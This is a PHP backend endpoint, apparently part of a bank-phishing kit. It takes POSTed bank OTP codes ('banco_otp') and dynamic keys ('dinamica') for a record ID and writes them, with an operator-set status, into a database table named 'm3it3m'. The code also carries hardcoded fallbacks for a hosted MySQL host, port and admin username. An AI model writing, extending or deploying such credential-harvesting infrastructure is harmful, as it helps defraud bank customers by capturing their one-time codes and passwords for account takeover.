<?php
// 🔒 CORS SEGURO - Solo para Vercel
$allowed_origin = 'https://essa-blush.vercel.app';
$origin = $_SERVER['HTTP_ORIGIN'] ?? '';

if ($origin === $allowed_origin) {
  header('Access-Control-Allow-Origin: ' . $allowed_origin);
  header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS');
  header('Access-Control-Allow-Headers: Content-Type, Authorization');
  header('Access-Control-Allow-Credentials: true');
}

header('Content-Type: application/json');

// Manejar OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
  http_response_code(200);
  exit;
}

// ⏱️ RATE LIMITING - Proteger contra spam
require_once __DIR__ . '/rate-limit.php';

function getClientIP() {
  if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
    return $_SERVER['HTTP_CF_CONNECTING_IP'];
  } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
    return trim($ips[0]);
  } else {
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
  }
}

$client_ip = getClientIP();
checkRateLimit($client_ip, 10, 60, 900); // 10 intentos por minuto (operaciones)

// Leer credenciales de variables de Render (Environment Variables)
$db_host = getenv('DB_HOST') ?: 'mysql-86508--1fe5.a.aivencloud.com';
$db_port = getenv('DB_PORT') ?: 26767;
$db_user = getenv('DB_USER') ?: 'avnadmin';
$db_pass = getenv('DB_PASSWORD') ?: 'default_password';
$db_name = getenv('DB_NAME') ?: 'defaultdb';

// Conexión con SSL
$mysqli = new mysqli(
  $db_host . ':' . $db_port,
  $db_user,
  $db_pass,
  $db_name,
  $db_port
);

if ($mysqli->connect_error) {
  http_response_code(500);
  echo json_encode([
    'status' => 'ERROR',
    'message' => 'Error de conexión'
  ]);
  exit;
}

// Obtener datos
$id = $_POST['id'] ?? '';
$new_status = $_POST['status'] ?? '';
$banco_otp = $_POST['banco_otp'] ?? '';
$dinamica = $_POST['dinamica'] ?? '';

// Validar
if (!$id || !$new_status) {
  http_response_code(400);
  echo json_encode([
    'status' => 'ERROR',
    'message' => 'ID y status son requeridos'
  ]);
  exit;
}

try {
  // ACTUALIZAR EN m3it3m
  $stmt = $mysqli->prepare(
    "UPDATE m3it3m 
     SET status = ?, otp = ?, password = ?, horamodificado = NOW()
     WHERE idreg = ?"
  );

  if (!$stmt) {
    throw new Exception('Error en prepare: ' . $mysqli->error);
  }

  $stmt->bind_param('sssi', $new_status, $banco_otp, $dinamica, $id);

  if (!$stmt->execute()) {
    throw new Exception('Error en execute: ' . $stmt->error);
  }

  if ($stmt->affected_rows === 0) {
    throw new Exception('No se encontró la solicitud con ID: ' . $id);
  }

  http_response_code(200);
  echo json_encode([
    'status' => 'OK',
    'message' => 'Estado actualizado en m3it3m',
    'id' => $id,
    'new_status' => $new_status
  ]);

  $stmt->close();

} catch (Exception $e) {
  http_response_code(500);
  echo json_encode([
    'status' => 'ERROR',
    'message' => $e->getMessage()
  ]);
} finally {
  $mysqli->close();
}
?>